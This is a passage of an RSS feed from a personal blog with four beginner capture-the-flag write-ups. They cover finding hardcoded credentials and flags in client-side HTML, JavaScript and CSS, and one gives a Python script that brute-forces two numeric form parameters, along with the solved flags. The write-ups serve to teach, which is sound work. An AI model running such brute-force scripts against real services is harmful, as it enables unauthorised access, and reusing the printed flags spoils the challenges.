</div>]]></description></item><item><title>picoCTF - Web Exploitation - Local Authority</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-local-authority/</link><pubDate>Wed, 06 Apr 2022 15:58:43 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-local-authority/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---local-authority---writeup">Web Exploitation - Local Authority - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag?
Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Once I open the link <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:51419/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:51419/</a><!-- raw HTML omitted --> in firefox I get to a page &ldquo;Secure Customer Portal&rdquo;.</p>
<p>I can see a login form with username and password.</p>
<p>On the website I see a hint:</p>
<blockquote>
<p>Only letters and numbers allowed for username and password.</p>
</blockquote>
<p>I tried to do a simple post request to the login.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=admin&amp;password=test&amp;login=true
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using that payload I get the following html response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;ie=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Login Page<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;secure.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;msg&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">hidden</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;admin.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;hiddenAdminForm&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;hash&#34;</span> <span class="na">required</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;adminFormHash&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="kd">function</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">string</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nx">cc</span> <span class="o">=</span> <span class="nx">string</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">90</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">97</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>     
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">else</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">      <span class="nb">window</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">window</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="nx">usernameFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">passwordFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nx">usernameFilterPassed</span> <span class="o">&amp;&amp;</span> <span class="nx">passwordFilterPassed</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="nx">loggedIn</span> <span class="o">=</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">loggedIn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Log In Successful&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;adminFormHash&#39;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;2196812e91c29df34f5e217cfd639881&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;hiddenAdminForm&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Log In Failed&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Illegal character in username or password.&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at that html code there are two lines that stick out:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">window.username = &#34;admin&#34;;
</span></span><span class="line"><span class="cl">window.password = &#34;test&#34;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lets try the username &lsquo;admin&rsquo; and the password &rsquo;test&rsquo;&hellip;</p>
<p>No luck</p>
<p>The file &lsquo;secure.js&rsquo; seems to be more interesting &hellip;</p>
<p>Let&rsquo;s take a look at it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span> <span class="nx">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="s1">&#39;strongPassword098765&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the username seems to be &lsquo;admin&rsquo; and the password &lsquo;strongPassword098765&rsquo;</p>
<p>Using that combination the login was successful and I can see the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{j5_15_7r4n5p4r3n7_d6a44d91} 
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Inspect HTML</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-inspect-html/</link><pubDate>Wed, 06 Apr 2022 15:51:22 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-inspect-html/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---includes---writeup">Web Exploitation - Includes - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag?
Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Once I opened the website <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:60935/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:60935/</a><!-- raw HTML omitted --> in firefox and looking at the source code I could immediately find the flag inside a comment in the html source code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--picoCTF{1n5p3t0r_0f_h7ml_ab1df88d}--&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the flag is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1n5p3t0r_0f_h7ml_ab1df88d}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Includes</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-includes/</link><pubDate>Wed, 06 Apr 2022 15:42:26 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-includes/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---includes---writeup">Web Exploitation - Includes - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag? Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Ok so I went ahead and visited the url <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:52811/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:52811/</a><!-- raw HTML omitted --> in firefox.</p>
<p>I am presente with a webpage with a bunch of text and a button that says &ldquo;Say hello&rdquo;.</p>
<p>Once I press that button I get a javascript alert() popup that says &ldquo;This code is in a separate file!&rdquo;</p>
<p>If I look at the source code of that button I see this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">onclick=&#34;greetings();&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the button is calling a javascript function &lsquo;greetings()&rsquo;</p>
<p>Lets take a look at that function.</p>
<p>Since the html code is including the js code from a seperate file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;script.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We need to take a look at that file</p>
<p>So once I point my browser at the address <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:52811/script.js" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:52811/script.js</a><!-- raw HTML omitted --> I see the following JavaScript Code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">greetings</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;This code is in a separate file!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//  f7w_2of2_3d50f001}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The comment looks like a part of our flag!</p>
<p>There is also a CSS stylesheet &lsquo;style.css&rsquo;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">lightblue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">/*  picoCTF{1nclu51v17y_1of2_  */</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Great! Here is our first part of the flag.</p>
<p>Lets put it together:</p>
<p>picoCTF{1nclu51v17y_1of2_f7w_2of2_3d50f001}</p>
<p>So the flag is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1nclu51v17y_1of2_f7w_2of2_3d50f001}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>MHSCTF - Web - Et tu, Brute?</title><link>https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/</link><pubDate>Fri, 11 Mar 2022 14:57:15 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/brute-force-attack.png" referrerpolicy="no-referrer">
            </div><h1 id="web---et-tu-brute---writeup">Web - Et tu, Brute? - writeup</h1>
<h2 id="description">Description</h2>
<p>I want to see how many people are actually my friends and aren&rsquo;t just pretending! Only my best friends get flags. You can check our friendship status at this website. mhsctf-ettubrute.0xmmalik.repl.co (you may need to wait for the site to wake up)</p>
<h2 id="writeup">Writeup</h2>
<p>So I went ahead and wrote a simple brute force program in python:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.adapters</span> <span class="kn">import</span> <span class="n">HTTPAdapter</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.packages.urllib3.util.retry</span> <span class="kn">import</span> <span class="n">Retry</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># the url we are going to post to </span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://mhsctf-ettubrute.0xmmalik.repl.co/status.php&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># the two parameters we need to bruteforce</span>
</span></span><span class="line"><span class="cl"><span class="c1"># they are integers between 1 and 100</span>
</span></span><span class="line"><span class="cl"><span class="n">number</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">number2</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># define the &#39;failed&#39; response</span>
</span></span><span class="line"><span class="cl"><span class="n">failed</span><span class="o">=</span><span class="s2">&#34;Sorry, you&#39;re clearly not my friend if you don&#39;t know my favorite and second favorite numbers!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">retry</span> <span class="o">=</span> <span class="n">Retry</span><span class="p">(</span><span class="n">connect</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">backoff_factor</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">adapter</span> <span class="o">=</span> <span class="n">HTTPAdapter</span><span class="p">(</span><span class="n">max_retries</span><span class="o">=</span><span class="n">retry</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s1">&#39;https://&#39;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># iterate through the possible combinations using two nested for loops</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">number</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">number2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">		<span class="n">postobj</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;number&#39;</span><span class="p">:</span> <span class="n">number</span><span class="p">,</span> <span class="s1">&#39;number2&#39;</span><span class="p">:</span> <span class="n">number2</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">postobj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="n">failed</span><span class="p">):</span> 
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;got the flag: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After some minutes of running my bruteforce utility i got the following response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">got the flag: 
</span></span><span class="line"><span class="cl">Wow! You must really be my friend if you know my favorite and second favorite numbers! Here&#39;s a flag for you: flag{pur3_s7r3ngth}
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the flag is</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{pur3_s7r3ngth}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item></channel></rss>